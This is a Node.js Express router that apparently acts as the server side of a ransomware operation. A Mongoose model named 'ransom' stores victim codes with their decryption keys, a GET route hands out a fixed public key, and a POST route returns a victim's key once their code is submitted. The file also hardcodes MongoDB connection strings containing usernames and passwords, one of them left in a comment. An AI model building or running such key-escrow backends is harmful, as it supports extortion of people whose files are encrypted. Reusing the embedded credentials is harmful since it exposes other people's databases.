var express = require('express');
var router = express.Router();
//var databaseURL = "mongodb://heroku_lx4hjpkv:t4cvpssm2e00h0o6odjdv5ecng@ds043324.mongolab.com:43324/heroku_lx4hjpkv";
var databaseURL = "mongodb://amandamt:password@ds015942.mlab.com:15942/heroku_wf9dpjj3";

var mongoose = require('mongoose').connect(databaseURL);
//var sanitize = require('mongo-sanitize');

(mongoose.connection).on('error', console.error.bind(console, 'connection error:'));
Schema = mongoose.Schema;
var db = {};
var keySchema = new Schema({userCode: String, key: String});
var unlockKey = mongoose.model('ransom',keySchema);



/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Welcome' });
});

router.get('/api/addTest*', function(req, res){
    var dataToAdd = new unlockKey({
        userCode: "test12233",
        key: "testinggggg"

    });

    dataToAdd.save(function(err, data){
        if(err){
            console.log(err);
        }

        else{
            console.log('Saved', data);
            res.send("success");
        }
    });

});

router.get('/publicKey', function(req, res){
    res.send("nVgNAHJ9Yq8ceMb_mD7QpxaziEhhD0MH");
});


router.post('/privateKey', function(req, res){
    //console.log(req);
    var dataToAdd = new unlockKey({
        userCode: req.body.userCode,
        key: req.body.key

    });

    dataToAdd.save(function(err, data){
        if(err){
            console.log(err);
        }

        else{
            console.log('Saved', data);
            res.send("success");
        }
    });
});

router.post('/', function(req, res){
    var query = unlockKey.find({userCode: req.body.code})
        .populate("_id.key");

    query.exec(function (err, key) {
        if (err) {
            return console.log(err);
        }

        else{
            if(key.length == 0){
                res.send("key not found");
            }
            else {
                console.log(key[0]['key']);
                console.log('Found!');
                res.send(key[0]['key']);
            }
        }
    });

});

module.exports = router;
